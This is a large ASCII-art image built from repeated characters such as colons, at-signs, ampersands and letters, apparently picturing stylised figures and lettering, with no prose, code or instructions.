::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.............:!5&@@@@BP&@&PPPPPPPPPPPPPPPG#@@@@@&G55555555555555555555555555PPPPGGBB##&&&@@@@@&&&&&&&#########&&&&&&&@@@@&&&##BBGGPPP5555555P5555555555PG#@@@@@#[email protected]@#P#@@@@&G555PG#&@&@@@@PJ5B&@@@@&P7:........:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.......:...^[email protected]@&@@@@BP&@@GPPPPPPPPPPPPPPPPG#@@@@@&GP55555555555555555PPGGB#&&&@&&#BGP55J?7!!~^^^^:::::::::::::::^^^~!!7?Y5PGG##&@@&&&#BBGPP55555P5555G#@@@@@#GPPPPPPPPPPPPPPPP#@@BP&@@@@&[email protected]@@@&?777?5#@@@@@#Y~.....::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.........~5&@&[email protected]@@@&[email protected]@#PPPPPPPPPPPPPPPPPPG#@@@@@&BP555555555PPGG##&&&#BGP5J?77!!!!77??JJYY555PPPPPPPPPPP5555YYJJ??7!!~^^^::^~!7JYPGB&&@&&#BGPP5PB&@@@@@#GPPPPPPPPPPPPPPPPPP&@&[email protected]@@@@&[email protected]@@@P7777777JP&@@@@&P~.....:::::::.:::::::::::::::::::::....::::::::::::::.::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....::.........:7G&@&BP555#@@@@BP&@@BPPPPPPPPPPPPPPPPGBPGB&@@@@@&BGPPPGB#&@@@&&BGPPPPGGB##&&@@@@@@&&&&&&&##############&&&&&@@@@@@@@&&##BGPYJ?7!!!7?5PB&@@&&&@@@@@#GPGPPPPPPPPPPPPPPPPP#@@#P&@@@@@#[email protected]@@@#[email protected]@@@@P!............:::::::::::::::::::.......:::...........:::::::::...........:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....::....:..:[email protected]@#GP55PP5P&@@@@[email protected]@@[email protected]&#GPG#@@@@@@@&@@@@@@@@@&&&&&&###BBBBGGGGGGPPPPPPPPPPPPPPPPPPPPPPPPPPPPGGGGGGBBBB###&&&&&&&&#BBGG#@@@@@@@&BPPB&&[email protected]@&[email protected]@@@@&[email protected]@@@&[email protected]@@@@G!...:......:::::::::::::::::::.......:::..:............................:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:::.::....:[email protected]@#[email protected]@@@&[email protected]@@GG&BPPPPPPPPPPP#@@@@&##@@@@@@@@&&###BBGGGGPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPGGGGBB###&&&@@@@@###@@@@GPPPPPPPPPPPB#[email protected]@@[email protected]@@@@@[email protected]@@@@[email protected]@@@@5^..:.....:::::::::::::::::::........:..:.:.^Y5J?:....................:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..::::....:[email protected]@#[email protected]@@@&[email protected]@@#[email protected]&[email protected]@@@@@@&&##BBGGGPPPPPPPPPPPPPPPPPPPP555YYJ??77!!~~~^^^^^^:::^^^^^~~!!77?JJYY555PPPPPPPPPPPPPPPPPPPPPGGGBB##&&@@@@&BBGGPPPPPG&&G#@@@[email protected]@@@@@#[email protected]@@@@[email protected]@@@&J:.....::::::::::::::::::::...:[email protected]@@5....................::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::........:[email protected]@#[email protected]@@@@BG&@@&&@@&&##&&@@@&&#BBGGPPPPPPPPPPPPPPPP55YJJ?7!~~^::..                                      ...:::^~!!7?JY5PPPPPPPPPPPPPPPPPPGGB##&&@@&&##&@&B&@@&[email protected]@@@@@&[email protected]@@@&Y777?PPPPPPPPPPP5J77777Y#@@@@B!.....::::::::::::::::::::::.75YYYYYYYY5&@@&5YYYYYYYYYYYYYYYYYY57..::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@#G555555555555555555G&@@@@#G#@@@@@@@&&#BBGGPPPPPPPPPPPPPPPPG5J!~::..                             !^7:                                ..:^~!?JPPPPPPPPPPPPPPPPPPGBB#&&@@@@@@&G#@@@@@@&P5P55G&@@@@#J777?PPPPPPPPPPPPPP5J77777P&@@@@Y:....::::::::::::::::::.::.Y&&&&&&&&@@@@&#&&&&&&&&&&&&&&&&&&&&Y..::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:[email protected]@#GP5P5P5555555555555555P#@@@@@@@@@&#BGPPPPPPPPPPPPPPPPPPPPPG#?  ..        .^~!7?JY55GB5. J5YJJ7   7G^Y~ !55YYYJJJJ?7.  7?7!~!?^.            .. .YBPPPPPPPPPPPPPPPPPPPPPGBB#&@@@@@@@@@#P555P#@@@@@[email protected]@@@@J..::::::::::::::::::::.:..::::::::J&@@P^.:::::::::::::::::::::.:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:.:J&@&[email protected]@@@@#BGPPPPPPPPPPPPPPPPPPPPPPPPP#J ^G##P^      [email protected]^^^G&: [email protected]@7  [email protected]@7   [email protected]^[email protected] :777?J#@PYYYJ7      7B##Y..GBPPPPPPPPPPPPPPPPPPPPPPPPPG#&@@@@&B55PPB&@@@@[email protected]@@@@P..::::::::::::::::::::...:......:5&@@&P555555555555555555Y^....:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:::.::[email protected]@[email protected]@@#GPPPGGPPPPPPPPPPPPPPPPPPPPPPG#^ !#&&#~      .?JJB&&Y7!^[email protected]  :#&~   P#P&^  [email protected]~  5&7  [email protected] ~G&GJJG#YJ5GP~      J&@&B: J#[email protected]@@&GGB#&@@@@#[email protected]@@@@#~...::::::::::::::::::......::[email protected]@@@&################@@@&~...::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::....:..:..^[email protected]@&G55P5P5555555555555555555555P#@@&PPPGBBBGGPPPPPPPPPPPPPPPPPPPPP#!  :~~.       .??5#7.~!7?GB~  [email protected]!   :&5.&B: [email protected]:.P#~   [email protected]?.5#&PJJ??JJ???^       :~~.  [email protected]@@@@@@@@@#577777JPPPPPPPPPPPPPPPPPPPGGBBGB&@@@@@#~..:.:::::::::::::::::::.:.....~5&@@@@@[email protected]@#~....:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....:...7#@&BP5P55555555555555555555555555P&@@#PPPBBGBBBB##GPPPPPPPPPPPPPPPPP&?              ~Y?:J? JG~~#? [email protected]!   [email protected]! [email protected]:.^!5&[email protected]????JJ5&J             .GBPPPPPPPPPPPPPPPPPB##[email protected]@@@@@@@BY77777J5PPPPPPPPPPPPPPPPPPGGBBBGB&@@@@@B~.....::::::::::::::::::.::...~Y&@@BY&@@#PPPPPPPPPPPPPPPP#@@#~....:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::........:[email protected]@#G5P5555555555555555555555555555P#@@&PPP&&#B#&#BGPPPPPPPPPPPPPPPPPP#Y               GP G&^^5P^[email protected] ~B#GPPBY      :^^^:5BG5?^.  [email protected][email protected]             :#GPPPPPPPPPPPPPPPPPGG#&&#B#@#[email protected]@@@@&GJ77777J5PPPPPPPPPPPPPPPPPPGGBBBGB#@@@@@@#^.......::::::::::::::::::.:.!P&@@B?:~&@@BY555555555555555#@@#~....:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:..:[email protected]&BP5PPP5P55555555555555555555555P55#@@&GPG&@@&#GPPPPPPPPPPPPPPPPPPPPPGG.             ^#5 !GP5YJ!.!7.  :^^:.            ::       !JJJYYYYYYB#^             ~&GPPPPPPPPPPPPPPPPPPPPPB#@@@[email protected]@@@G?7777?Y5PPPPPPPPPPPPPPPPPPGGBBBBB#&@@@@@&@@G~..::.:::::::::::::::::::...7B&P7:..!&@@5                [email protected]@#~....:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....?&@&G5555555555555555555555555555555PPB&@@@GPG&&BPPPPPPPPPPPPPPPPPPPPPPPPG&:  .~~^       .^.                                              ..:^^.       :~~^.  7&PPPPPPPPPPPPPPPPPPPPPPPPGB&#[email protected]@@G7777JYPPPPPPPPPPPPPPPPPGGGBBBBBBB&@@@@@@#PG&@&?..::.::::::::::::::::::....::[email protected]@@#GGGGGGGGGGGGGGGG&@@#~....:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::........:.:[email protected]@#P5555555555555555555555555555555PB&@#@@@&##GPPPPPPPPPPPPPPPPPPPPPPPPPPP&! [email protected]#&Y                    ..:^^^^^~!!!!!!!~~^^^^^^^:::..                 :###@5  Y#PPPPPPPPPPPPPPPPPPPPPPPPPPPBB#@@@&?7?Y5PPPPPPPPPPPPPPPGGGGBBBBBGBB&@@@@@@&BP55P#@@Y:............:::::::::.::......:[email protected]@@[email protected]@#~....:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:.........^[email protected]@BP555555555555555555555555555555PG&@#G#@@&#GPPGGPPPPPPPPPPPPPPPPPPPPPPPPP#Y  ?BBP~     ..:^~!7?JJJJYY55PGGGGGGGGGGGGGGGGGGGGGGGGGGPPP55YYJ7!~^:..     ?GBG!  PBPPPPPPPPPPPPPPPPPPPPPPPPGGPPPB#@@&GPPPPPPPPPPPPPPGGGGGBBBBBBBGB#&@@@@@@&BP5PPP5P#@@P^............::::::::::::.::::[email protected]@@5 ...........    [email protected]@#~...::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::....:.:.::[email protected]&B5555P55555555555555555555555555G#@@P5&@&BGPPGGBBGGPPPPPPPPPPPPPPPPPPPPPPPBP    .:^!?YY5PPPGG&&B&BGGGGGGGGBBBBBBBBBBBBBBBBBBBBBBBGGGGGGG#&[email protected]?7~^:.   ~#PPPPPPPPPPPPPPGGPPPPPPPGGBBGGPPPG#@@&BGGGGGGGGGGGBBBBBBBBBBGBB#&@@@@@@&BP55555PP5PB&@B~....::....::::::::::::::::::[email protected]@@5.....:...:[email protected]@&~...::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::....:.....!#@&G55P555555555555555555555555555PB&@[email protected]@#PPPGGBBBBBBBGGGGBBBBBGPPPPPPPPPPPG##G555PGG#@&GGGGBBB##B#BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB###BBBGGGG#@&GGP5Y5B#[email protected]@&BBBBBBBBBBBBBBBBBBGBB#&@@@@@@@#BP555555555555G&@#!.::.:....:::::::::::::::::::[email protected]@@P.........~#@@@@@@@&5:.::.:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::......:..!&@&G5555555555555555555555555555P5G&@&Y: [email protected]@BPPG&#BBGGGGBBB###BGGPPPPPPPPPPPPGB#B&BGBBBB&@@&BBBBBBBBB########&&&&&&&&&&&&&&&&&&&&&&&&&&&#######BBBBBBBB#&@@&BBBBG#&B#GPPPPPPPPPPPPPGGB##BBBBGGGBBB&#PPG&@@BBBBBBBBBBBBBBGBBB#&@@@@@@@&#GP55P555555555555G&@#!...::...::::::::::::::::::..^Y55?..:......:!777777!^..:::.:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::........7&@&G5P5555555555555555555555P5555PB&@[email protected]@&PPP#@@&&#####BGGPPPPPPPPPPGGGGBBBBBBBBB####&@@@&&&&&&&&&&&&####BBBBBGGGGGGGGGGGGGGGGGBBBBBB####&&&&&&&&&&&@@@@@#####BBBBBBBGGGGPPPPPPPPPPPGGB#####&&@@[email protected]@&BBBBBBBBBGGBBB#&@@@@@@@@&#GP5555555555555P55555G&@&!.::....:::::::::....:.....:............:... .........:.:..::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.......!#@&G55555555555555555555555555555P#@@P^....^[email protected]@#PPP&@@@&#BGPPPPPPPPGGGBBBBBBB#####&&&&&&###@@@@&PYYJ???777JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJ7777??JYY5&@@@@@###&&&&&&#####BBBBBGGGGPPPPPPPPPGB#@@@@BPPP#@@#GGGGBBBB##&&@@@@@@@@&&BGP555555555555555555P5PP5G&@#!.:...::::::::::...............7??7:....!??7:............:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::...:::.!#@&G5555PP5555555555555555555PP55G&@&?:.:.::.^[email protected]@#GPB&#GPPPPPPGGGGBBB####&&&&###BBGGP55YYJJ?J&@@@B~        :777777777777777777777777777777777^        [email protected]@@@@BJJYY55PGGBB###&&&&####BBBGGGPPPPPPPGB#&GPB&@@#B####&&@@@@@@@@@@@@#BPP555555555555555555555P555P5G&@#!.:.:::::::::::.....::::::::::#@@#^::::[email protected]@#~.::::::::...:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....~#@&G555555555555555555555555555P5B&@B!.........7&@@&#BGPPPPGGGBB###&&&###[email protected]@@@Y:      .77777777777777777777777777777777?:      [email protected]@@@@@G77777777???JYY55PGGBB##&&&&##BBGGGPPPPPGB#@@@@@@@@@@@@@@@@@&#[email protected]&B55P5P555555555555555555555555P5G&@#~.:..::::::::.::..^B#########&@@&#####&@@@#########!...:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....^[email protected]&[email protected]@G^.:[email protected]@&#GPPPPGGBB#&&@&#BGGP55YJJ???7777777JYY?77777!~Y&@@@#?     ~77777777777777777777777777777777?~     [email protected]@@@@BJ77777?YYJ7777777???JYY55PPGGB&&@&##BGGPPPPPG#@@@@@@@&&#BP5J7~:..^[email protected]@BP5P5555555555555555555555555555G&@G^...:::::::::.:.::!777777777#@@#[email protected]@#[email protected]@@7..::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:..:[email protected]@B55P55555555555555555555555P55B&@G^[email protected]@#PPPPPGB#&&@@@#[email protected]#BY77777!?G&@@@B!:^!77777777777777777777777777777777777!^:^[email protected]@@@@BY77777YB#[email protected]??JYY5PGB&@@@&&#GPPPPPG&@@@@BJ!^.. .......:[email protected]@[email protected]@5:.::::::::::....... .    . #@@#.   [email protected]@#: .. [email protected]@@7..::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@#[email protected]@P:.:..::[email protected]@BPPPPB&@@@@@#5J??7777777777777777777J5?7?P##5?77777JP&@@@BJ777777777777777777777777777777777777775&@@@&GY7777?5##P?7?5J777777777777777777??JJ5G&@@@@@#PPPPP#@@@@@@&#PJ!^.......:[email protected]@#P55555555555555555555555555PPP5#@@J..::::::::::.....^????????#@@#[email protected]@#[email protected]@@7...:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..!&@&[email protected]@P:.:.:.:::::[email protected]@&PPPG&@@##BY7777777777777777777777777777777YB&P?77777?5#@@@[email protected]@@#P?7777?P&BY7777777777777777777777777777777JPBB&@@[email protected]@&B#&@@@@@@&G5?~:[email protected]@#P5P555555555555555555555555PGB&@@&?..:::::::::...:[email protected]@@#BBBB&@@&BBBBB&@@&BBBBBBBBB!..::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]&[email protected]@G:.:.::::::::[email protected]@#GPPB##@&Y7777777777777777777777777777777???5#&[email protected]@@[email protected]@&GY77777JG&[email protected]&#BGPPG&@&Y77?YPB&@@@@@@@#G5?!^[email protected]@B55555555555555555555PPGB#&&@@@@@@@!.::::::::...:[email protected]@@~....#@@#:...:[email protected]@#^..........:.:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@#5555P55555555555555555555555G&@B^....:::::::::.:[email protected]@&BGPPP#G7777777777777777777777777777?5G#&&@&&@@@BY777777?P#@&P?777777777777777777777777777Y#&[email protected]@&#&&&&#BPJ7777777777777777777777777777Y&GPPGG#@@@P7777777?J5G#&@@@@@@@&#@@@BGPPPP55555PPPPGGBB#&@@@@@@@@@@@@@G...:..........:[email protected]@B^.::.#@@#:.:.:[email protected]@#~..:::::.:.:..::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::......:...~&@&P5555555555555555555555555P5P&@&!.::.:::::::::...:[email protected]@@@&&&@Y777777777777777777777777777P&@@@@@@@@@@@@@#5?777777JPBGJ7777777777777777777777777Y5Y?77777?P#@@@@@@@@@@@@@@G?77777777777777777777777777?&@&&@@@@&BGG5J?77777777?J5G#&@@@@@@@@@@&&&&&&&&&&&@@@@@@@@@@&[email protected]@@@&!.:.......:...~&@@&####B&@@@#####&@@&#######BB#7..:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::......::[email protected]&G5P5555555555555555555555555P#@@?.:::.:::::::::.:[email protected]@&[email protected]@@@@@@@@@@@@@@&B#BY?777777??7777777777777777777777777777777?YB#B#@@@@@@@@@@@@@@@#?77777777777777777777777777#@@@&#BBBBBBBGP5YJ?777777777?JYPGB#&@@@@@@@@@@@@@@@@&&#[email protected]@@@@P.:......:.:..7###Y7777Y&@@[email protected]@#[email protected]@@?.::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::.:...:.:[email protected]@#[email protected]@5.......::::::::...:.... [email protected]@[email protected]@@@@@@@@[email protected]@@BJ5B#B5J?7777777777777777777777777777777?J5B#[email protected]@@BJ775&@@@@@@@@[email protected]@#BGGBBBBBBBGPPPP5YJ?777777777777?JJY555PPPPP55YYJ??77777777777J&@@@@@!..:....::...::::....:[email protected]@&! [email protected]@#^.... [email protected]@@7...::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::.....:..:[email protected]@G5P55P55555555555555555555P5P&@#^.......:::::::::[email protected]@@@@@@@@&!     7&@@P!7?5G#P7777777777777777777777777777777P#[email protected]@@J     ^#@@@@@@@@57777777777777777777777777?#@&@&BBBBBBBBBGPPPPPPP5YJ??77777777777777777777777777777??J77777J&@@@@@P::[email protected]@&?...:.:[email protected]@#^....^[email protected]@&~.:.::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@&P5555555555555555555555555P5#@@J.:....::::::::::........:#@[email protected]@@@@@@@P       [email protected]@&?7777??7777777777777777777777777777777??77777#@@B.      [email protected]@@@@@@@#[email protected]@@@@&[email protected]@@@@@@!.:.............:!P&@@G!.:....:[email protected]@#!PGGB&@@&J....::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::......:[email protected]@G5PP55555555555555555P5555P5G&@B:.:.....::::::::::::::.:[email protected]&[email protected]@@@@@@@B.      [email protected]@@[email protected]@@B.      [email protected]@@@@@@@@J7777777777777777777777777?&@@@@@@#[email protected]@@@@@@5........:.:^~?P#@@#5!:...:...:[email protected]@#~5GGGG5J~..:.:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::.......~#@&P55555555555555555555555555P#@@7..::....:::::::::::::::[email protected]#[email protected]@@@@@@@@P:   :[email protected]@@@J7777777777777777777777777777777777777777777?&@@@P^   ^[email protected]@@@@@@@@@[email protected]@@@@@@&[email protected]@@@@&@#^.......:.^[email protected]&#GY7^.....::...:[email protected]@#^.........:..:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::...:[email protected]@#5P555P555555555555555555555G&@B:...:...::::::::::::::::[email protected]#[email protected]@@@&&&@@@&BGB&@@@@#[email protected]@@@&BGB&@@@@&&@@@@@[email protected]@#Y&@@@@#GBBBBBBGPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP?7777#@@@@[email protected]@?.......:..^!^:........::....:~!!~:..........:.:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@[email protected]@J.....:....:::::::::.::.:.^#@[email protected]@@&BBB&@@@@@@@@@@@[email protected]@@@@@@@@@@@#[email protected]@@@@##[email protected]@&[email protected]@@@#[email protected]@@@&[email protected]@P:....::.::...........:.:.:^::.......:.::......:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::......:&@&P55555555555555555555P55555P&@&!..:......::::::::..:[email protected]?77!~^..         ..~YPG#&@@@@@@@@#B#&@@@@@@@@@@B?777777??77!~^::...         ...::^[email protected]@@@@@@@@@@&BB#@@@#GGGGBBB##P~         ..:^[email protected]@#!^[email protected]@@@&BGBBBBBBBGGPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP?777?&@@@@B5P&@#^......:...:7?~...::.:..^G&#G! .............:.:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@#P55555555555555555555555555G&@B:.:.::::::::::::::......7&@P?7~:              :[email protected]@@@@@@@@@@@@@@@G?7777?77!^:.                         ..^~!7??77775&@@@@@@@@@@@@@@@@BJ77!^:.:~JPY~            .^[email protected]@&?:[email protected]@@@&[email protected]@@@#P5P&@@!......:[email protected]@&[email protected]@@&555555555555J^...:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::[email protected]@[email protected]@Y..:.:::::::::::::::....7&@5!^.              .?5?^.    .:?P&@@@@@@@@@@@@@#GJ77??7!^:.            ..:^~~~^:..           .^!77?77?P#&@@@@@@&#BB&@@@@B!   ... .~Y~              ^[email protected]@&?.J&@@@@#[email protected]@@@&[email protected]@J...:.:.:..~5&@@&Y^..:Y&@@&####&&&###@@@@#^.:.:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@B5555555555555555555555P5PP5#@@7.::::::::::::::::::...^#@#^            .:~!7?J?7???77~!5&@@&B5YYY55555YJ?777!~:.           .~?5GB#&@@@@@&&#G5?~.         .:~!777??YY55YJ?77!!7Y&@@@P77?????77??!^.            ~&@@&! [email protected]@@@&[email protected]@@@&P5P55G&@5.:...::.....~P&@&[email protected]@@@&Y:.::::.:Y&@@B~..:.:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::......:[email protected]&G5555555555555555555555P5PPP&@@!.:::::::::::::::::[email protected]@J           :[email protected]@@&G~  .::^~~~~~~^^:.            .!5#@@@@@@@@@@@@@@@@@@@&P7.          .::^~~~~~~^^:.   .?P#@@@5?????J??JJJ?!:           [email protected]@@G:.:Y&@@@@&[email protected]@@@&P55P55G&@G........:!!:[email protected]@&5J#@@G7:..:[email protected]@@5^.:.:::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::......^[email protected]&P55555555555555555555555555P&@@^.:::::::::::::::::::.!&@#^          [email protected]@&PJ?!                           [email protected]@@@@@@@@@@@@@@@@@@@@@@@@#?                         ~???JP&@@P???????????JJ!.         ~&@@@[email protected]@@@@#BGBBBBBBBBBBBBBBBBBBBBBBBBBBBBBGJ77J#@@@@&P5555P5G&@B:....:[email protected]@B?:. [email protected]#5~..^Y#@@[email protected]@&G!.......:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::...:..^#@&P55555555555555555555555555P&@#^.::::::::::::::::::[email protected]@5~:        ^J?????????????J#@@BJ???J~                         ^&@@@@@@@@@@@@@@@@@@@@@@@@@@@@7                       [email protected]@G????????????J!        :[email protected]@@[email protected]@@@@&BBGBBBBBBBBBBBBBBBBBBBBBBBBBGJ7?P&@@@@#P5555555P&@#^...:..:[email protected]@@B?:.:^^..... [email protected]@@@@@B7.........:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::...:..~#@&P55555555555555555555555555P&@B:.::::::::::::::::::[email protected]@J~~^.      ^J????????????J#@&5?????J!                         [email protected]@@@@@@@@@@@@@@@@@@@@@@@@@@&^                       [email protected]@5???????????J!       :~^[email protected]@@G:......!P&@@@@&#BBGGBBBBBBBBBBBBBBBBBBBBP?7Y#@@@@&G55P555555P&@#^...:.:..:[email protected]@&?.....::~?5B&@@#B&@@#PJ7~:.......::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::..:...~&@&P55555555555555555555555555P&@#^.::::::::::::::::::[email protected]@J~~~~.      [email protected]&Y????JJ7.                          [email protected]@@@@@@@@@@@@@@@@@@@@@@@@&7                         [email protected]&J????????JJ!.     .^~~^[email protected]@@G:.:::....~Y#@@@@@&##[email protected]@@@@BP5P5P555555P&@#~..:.......:??:..!?YPB#&&&B5?~:.^?5B&@@&#BP5?..::.::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::.....^#@&P55555555555555555555555555P&@&^.:::::::::::::::::[email protected]@Y~~~~~:      :[email protected]&Y?JJJ?7^                             ^5&@@@@@@@@@@@@@@@@@@@@@@P~                           :[email protected]??JJJJJ?!:      :~~~~^[email protected]@@5..:........:75#@@@@@@&&##BBBBBBBBBBBBGY5#@@@@@#P555P55555555P&@#^..::.....:..~5Y7Y###@@@#BPP5PPPPPPPB#@@@#&G~.::..::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::.....^#@&P555555555555555555555555P5P&@@~.::::::::::::::::::[email protected]@P~~~~~~~:      .:^[email protected]!~:.                                .!5#@@@@@@@@@@@@@@@@@#5!:.                             .:~!77??##???7!~:.      .^[email protected]@@7.::.::::::....:!YG&@@@@@@@@@&&&&&&&&&&@@@@@@#G55P55555555555P&@#^.:::....::.~#@@#^::[email protected]@@#B#########BB&@@&!::.:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::.....^[email protected]&P55555555555555555555555555P#@@7.:.:::::::::::::::::.!&@#!~~~~~~~^:          ..:G?.                                       ..^7YPB&@@@@@@@&#GY7^:.                                     . ^5:.          .^~~~~~~~!&@@G:.:..:::::::::.....^!J5G#&@@@@@@@@@@@@@@@&#BP55PP555555555555G&@B:..::.:....!#@@&[email protected]@@?..........:[email protected]@&!...:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::......:[email protected]&[email protected]@J.::.::::::::::::::::[email protected]@5^~~~~~~~~~:.         .Y^                                           ..:^~!7#@&J!~^::..                                         :P.        .:^~~~~~~~~^[email protected]@@!.:.:::::::::::.::.......:^[email protected]@&BBBBBGGGPP5555555555555555555G&@G...:.:.:..7#@@&[email protected]@@[email protected]@&!....::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@B555555555555555555555555555G&@G..:.::...::::::::::...^#@&7^~~~~~~~~~~^:.      .5^                         ^^                   .::^[email protected]&!::.                   :^                        :P:     .:^~~~~~~~~~~~7&@@Y..::::::::::::::::::[email protected]@[email protected]@5........:J&@@#[email protected]@@?::::::::::::[email protected]@&!...:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::...:[email protected]@B555555555555555555555555555P&@&~...:.....:::::::::....!&@#!~~~~~~~~~~~~~^:..  .5^                         .JY~                 .^[email protected]@@BJ^.                 ^JY.                        :5.  .:^[email protected]@P:.:::::::::::::::::::......:.^#@&[email protected]@J.:..::.^[email protected]@@B~...::[email protected]@@&&&&&&&&&&&&&&@@@!..::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::..::[email protected]@#P5555555555555555555555555P5#@@?.:...::..::::::::[email protected]@B!~~~~~~~~~~~~~~~~^:^5~                           !GGJ!:.         .^75#@@@@@@@#57^:.         :~?GB?                          !J^^[email protected]@G:..:::::::::::::::::::[email protected]@#P5P55P55555555555555555555555P&@@!.....:.:!YG5^.:[email protected]@&[email protected]@&!...:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::.:...:#@&P555555555555555555555555PP5G&@G:..:.:...:::::::::......7&@B7^~~~~~~~~~~~~~~~~~??^:..                        .!P##BPYJ?77?J5G&@@@@@#B#&@@@@&B5J?77?JYPB##G?.                      ..::^Y!~~~~~~~~~~~~~~~~^[email protected]@P:.:.::::::::::::::::::......:[email protected]@G5PP55555555555555555555555555P&@#^.....::.......::::..^~~~:............^~^~:.:.:::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@G555555555555555555555555P55P&@&~.:::.:..:::::::::..:....7&@&J^^~~~~~~~~~~~~~~~~?~~~~~^^::..                    :!J5G#&&&&@&&#BPY?!~^^!7YPG#&&@@&&&#GPJ!:                  ...:^^~~~~~~7~~~~~~~~~~~~~~~~:7#@@J:.::.:::::::::::::::::::.......~&@&[email protected]@5....................:......................:..:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]@#[email protected]@P:.......:::::::::..:...:[email protected]@5^:~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^::...                .:^^~~~~~^^::::::::::::^^~~~~~^:..             ...::^^^~~~~~~~~~~~~~~~~~~~~~~~~~~~^:[email protected]@B!..:...:::::::::::::::::::[email protected]@B5P55P555555555555555555555555P#@@?..............................................:::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::...:.:.^#@&G555555P555555555555555555P5P#@@7.......::::::::::.:......:[email protected]@#?..^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^:::....             .              .          ....::::^^^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~:[email protected]&Y:.:.:...:::::::::::::::::::.:....!&@#P55555555555555555555555555PP5P&@#^.:.........:::......:..........:..............:::::::::::::::::::::
